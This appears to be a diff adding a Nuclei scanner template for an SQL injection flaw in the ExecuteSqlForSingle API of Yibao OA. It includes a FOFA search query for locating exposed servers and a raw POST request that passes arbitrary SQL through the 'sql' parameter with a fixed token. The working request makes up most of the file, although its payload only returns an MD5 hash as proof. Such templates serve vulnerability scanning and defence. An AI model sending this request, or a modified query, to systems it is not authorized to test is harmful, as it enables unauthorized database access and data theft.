@@ -1,0 +1,31 @@
+id: yb-oa-api-system-executesqlforsingle-sqli
+
+info:
+  name: 易宝OA ExecuteSqlForSingle SQL注入漏洞
+  author: m0be1
+  severity: high
+  description: 易宝OA是一款非常强大的手机办公软件，这里不仅为广大的用户提供了一个更好的工作日历，而且每个人都可以在这里进行重要事项的记录，同时软件中还拥有更好的打卡系统，让用户可以快速记录自己的工作时常，而且调班与补卡也会更加的简单，让你工作活跃度得到提升。该产品存在SQL注入漏洞，可通过该漏洞获取数据库权限。
+  
+  reference:
+    - https://
+  metadata: 
+    fofa-query: title="欢迎登录易宝OA系统" || banner="易宝OA"
+    verified: true
+    max-request: 1
+
+http:
+  - raw:
+      - |
+        POST /api/system/ExecuteSqlForSingle HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
+        Content-Length: 103
+
+        token=zxh&sql=select substring(sys.fn_sqlvarbasetostr(HashBytes('MD5','123456')),3,32)
+        &strParameters=
+
+    matchers:
+      - type: dsl
+        dsl:
+          - 'status_code==200 && contains_all(body,"e10adc3949ba59abbe56e057f20f883e")'
